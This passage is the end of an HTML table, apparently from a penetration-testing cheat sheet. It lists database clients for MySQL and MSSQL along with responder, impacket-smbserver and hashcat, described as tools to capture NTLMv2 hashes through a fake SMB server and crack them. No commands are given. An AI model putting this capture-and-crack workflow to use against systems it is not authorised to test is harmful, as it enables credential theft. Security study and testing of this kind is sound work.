          <tr><td><code>mysql</code></td><td>Connect to MySQL / MariaDB</td><td>Linux/Win</td></tr>
          <tr><td><code>sqlcmd</code></td><td>Connect to MSSQL (native)</td><td>Windows</td></tr>
          <tr><td><code>sqsh</code></td><td>Connect to MSSQL from Linux</td><td>Linux</td></tr>
          <tr><td><code>mssqlclient.py</code></td><td>Connect to MSSQL (Impacket)</td><td>Linux</td></tr>
          <tr><td><code>responder</code></td><td>Capture NTLMv2 hashes via fake SMB</td><td>Linux</td></tr>
          <tr><td><code>impacket-smbserver</code></td><td>Fake SMB server for hash capture</td><td>Linux</td></tr>
          <tr><td><code>hashcat</code></td><td>Crack captured NTLMv2 hashes</td><td>Linux/Win</td></tr>
        </tbody>
      </table>
    </div>
  </section>
